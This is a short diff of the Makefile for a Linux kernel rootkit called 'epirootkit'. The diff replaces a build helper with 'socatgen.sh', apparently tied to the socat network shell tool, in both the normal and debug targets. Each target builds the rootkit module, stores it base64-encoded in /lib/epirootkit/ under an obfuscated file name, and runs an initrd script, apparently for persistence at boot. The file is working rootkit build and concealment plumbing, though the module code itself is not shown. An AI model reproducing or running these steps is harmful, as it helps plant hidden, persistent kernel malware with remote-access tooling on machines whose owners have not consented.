@@ -54,14 +54,14 @@ epirootkit-objs :=                              \
 all: modules
 
 modules:
-	@./scripts/generate.sh
+	@./scripts/socatgen.sh
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
 	@mkdir -p /lib/epirootkit/
 	@base64 epirootkit.ko > /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv
 	@./scripts/romance/initrd.sh
 
 debug:
-	@./scripts/generate.sh
+	@./scripts/socatgen.sh
 	$(MAKE) -C $(KERNELDIR) M=$(PWD) EXTRA_CFLAGS="-DDEBUG=1" modules
 	@mkdir -p /lib/epirootkit/
 	@base64 epirootkit.ko > /lib/epirootkit/cH0c01AtcG9ydC1rZXlzLmNv
